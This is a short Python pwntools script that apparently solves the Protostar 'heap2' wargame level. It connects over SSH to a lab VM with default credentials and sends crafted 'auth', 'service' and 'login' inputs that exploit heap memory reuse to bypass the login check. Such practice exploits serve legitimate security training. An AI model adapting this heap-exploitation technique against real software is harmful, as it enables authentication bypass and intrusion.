#!/usr/bin/env python3
from pwn import *
import re
context.update(arch='i386', os='linux')
context.bits =32

def execute_exploit():
    exe = '/opt/protostar/bin/heap2'

    s = ssh(host='192.168.12.128', user='user', password='user')
    sh = s.run(exe)
    print(sh.recvlineS())
    sh.sendline("auth " + 'a')
    print(sh.recvlineS())
    sh.sendline("service " + 'a'*17)
    print(sh.recvlineS())
    sh.sendline("login")
    output = sh.recvlineS()
    if 'you have logged in already!' in output:
        print("SUCCESS")
    else:
        print(output)
    s.close()

execute_exploit()


